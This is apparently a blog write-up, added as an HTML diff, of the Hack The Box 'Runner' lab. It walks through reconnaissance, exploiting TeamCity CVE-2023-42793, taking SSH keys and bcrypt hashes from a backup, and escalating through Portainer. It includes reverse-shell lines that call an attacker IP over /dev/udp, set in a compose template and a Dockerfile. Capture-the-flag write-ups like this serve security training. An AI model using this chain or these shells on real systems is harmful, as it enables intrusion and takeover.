@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Runner - abno</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Runner</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1723623566422"
+                  >2024-08-14 10:19</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1723639038316"
+                  >2024-08-14 14:37</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<h2 id="nmap">nmap</h2>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -A runner.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 08:18 UTC
+Nmap scan report <span class="hljs-keyword">for</span> runner.htb (10.129.182.43)
+Host is up (0.033s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Runner - CI/CD Specialists
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn<span class="hljs-string">'t have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<h2 id="dirbuster">dirbuster</h2>
+<p><img src="/_resources/e6674a3d868847c9b416ccc517809ba2.png" /></p>
+<h2 id="ffuf">ffuf</h2>
+<div><pre class="hljs"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u <span class="hljs-string">'http://FUZZ.runner.htb'</span> -<span class="hljs-built_in">fc</span> 302 -t 200</code></pre></div>
+<p>Does not give any resoults.</p>
+<h2 id="port-8000">port 8000</h2>
+<p>It hosts NSCA(Nagios Service Check Acceptor) Nagios addon.<br />
+<a title="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e" href="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e">https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e</a><br />
+<a title="https://support.nagios.com/kb/article/nsca-overview-78.html" href="https://support.nagios.com/kb/article/nsca-overview-78.html">https://support.nagios.com/kb/article/nsca-overview-78.html</a></p>
+<p>It seems to be one of the products of system monitoring solutions firm.<br />
+<a title="https://www.nagios.com/products/" href="https://www.nagios.com/products/">https://www.nagios.com/products/</a></p>
+<p>It only recieves input from monitoring services and after further some research it seems like a dead end.</p>
+<h2 id="gobuster">gobuster</h2>
+<p>Running gobuster with larger n0kovo subdomains list in vhost enumeration mode finally gives us some resoults.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://runner.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://runner.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   <span class="hljs-literal">true</span>
+===============================================================
+Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode
+===============================================================
+Found: teamcity.runner.htb Status: 401 [Size: 66]</code></pre></div>
+<h1 id="cve-2023-42793">CVE-2023-42793</h1>
+<p><a title="https://www.exploit-db.com/exploits/51884" href="https://www.exploit-db.com/exploits/51884">https://www.exploit-db.com/exploits/51884</a></p>
+<p><img src="/_resources/e54fcdeae2524f8792161809d787a524.png" /></p>
+<p>We are finally logged in somewhere.</p>
+<h1 id="teamcity">TeamCity</h1>
+<p>In team city, we can create a new project with build steps. Similarly to Jenkins, this can be used for getting reverse shell.</p>
+<p><img src="/_resources/46085b5b2402422c97e1abcb9f1a9472.png" /></p>
+<p>or that would be the case, if we couldnt just go to the admin panel and see all users including admin.</p>
+<p><img src="/_resources/d0d9a48fd91147a2bc446a7c5e65db85.png" /></p>
+<p>We can also get a backup of everything…</p>
+<p><img src="/_resources/50ba8c90574141069c6afe818a74a79d.png" /></p>
+<p>… and instead of searching in the gui, we can just find ssh keys.</p>
+<p><img src="/_resources/96c2146a19ad4bf895c7cbfb9e4e1f12.png" /></p>
+<p><code>ssh -i ./id_rsa john@runner.htb</code> allows us to log in as john and get the user flag.</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<h2 id="linenum">LinEnum</h2>
+<p>LinEnum returns nothing as usually.</p>
+<h2 id="portainer">Portainer</h2>
+<div><pre class="hljs"><code>Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
+tcp        0     76 10.129.182.43:22        10.10.14.81:42262       ESTABLISHED -                   
+tcp        0      0 127.0.0.1:54050         127.0.0.1:9000          TIME_WAIT   -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      - </code></pre></div>
+<div><pre class="hljs"><code>john@runner:/tmp$ ls /data
+bin  certs  chisel  compose  docker_config  portainer.db  portainer.key  portainer.pub  teamcity_server  tls</code></pre></div>
+<p>Using ssh tunneling <code>ssh -i ./id_rsa -L 8082:localhost:9000 john@runner.htb</code> , we can see that port 9000 is portainer, unfortunetly behind a password.</p>
+<p><img src="/_resources/e535ee9c4d9d4f1e84411c8c3da591c4.png" /></p>
+<p>Port 8111 is TeamCity.</p>
+<p><img src="/_resources/6043489f3b5c49e8bdc8f521ab5f1280.png" /></p>
+<p>In backup we can also find users file, hashed with bcrypt.</p>
+<div><pre class="hljs"><code>ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+<span class="hljs-number">1</span>, admin, $2a$07$cQmbW7GA2NePss1vKY8RleSQ8kPMiU6av/N5m00mFHthv69NBBXOW, John, john<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1723627560076</span>, BCRYPT
+<span class="hljs-number">2</span>, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1709150421438</span>, BCRYPT
+<span class="hljs-number">11</span>, city_adminq8dt, $2a$07$WJrTewhBjMRJGvEil6mxROo8RWeFimky0wPZt3pRvVgICHP61NlqG, , angry-admin<span class="hljs-symbol">@funnybunny</span>.org, <span class="hljs-number">1723628900193</span>, BCRYPT</code></pre></div>
+<p>Using john we get password for matthew, which is piper123.<br />
+We can use it to log into portainer.</p>
+<h3 id="yaml">yaml</h3>
+<p><img src="/_resources/28eeab3acf2e439ebb6ecb741ae210fe.png" /></p>
+<p>In custom templates, we can create our own reverse shell template:</p>
+<div><pre class="hljs"><code><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
+
+<span class="hljs-attr">services:</span>
+  <span class="hljs-attr">shell_reverse:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">alpine:latest</span>
+    <span class="hljs-attr">container_name:</span> <span class="hljs-string">shell_reverse</span>
+    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">-c</span> <span class="hljs-string">"sh -i &gt;&amp; /dev/udp/10.10.14.81/4242 0&gt;&amp;1"</span>
+    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span></code></pre></div>
+<p>But then we learn that deploying the stack is reserved for admin users.</p>
+<h3 id="creating-dockerfile">Creating dockerfile</h3>
+<p>We can try to create a malicious docker file and upload it manualy.</p>
+<div><pre class="hljs"><code>mkdir shell_reverse
+<span class="hljs-built_in">cd</span> shell_reverse
+touch Dockerfile
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'FROM alpine:latest'</span> &gt; Dockerfile
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'CMD sh -c "sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1"'</span> &gt; Dockerfile
+docker build -t shell_reverse .</code></pre></div>
+<p>But we cant deploy anything that is not from docker.io.</p>
+<h3 id="getting-flag-with-volume">Getting flag with volume</h3>
+<p>We have to create volume:</p>
+<p><img src="/_resources/c9c1997e95f541ed9f638408d816d338.png" /></p>
+<p>Then we have to attach it to a new container, for example teamcity.<br />
+After connecting as root to the container, we can see in /mnt the root flag.</p>
+<p><img src="/_resources/173419e77fb24f3ea93017505068db41.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
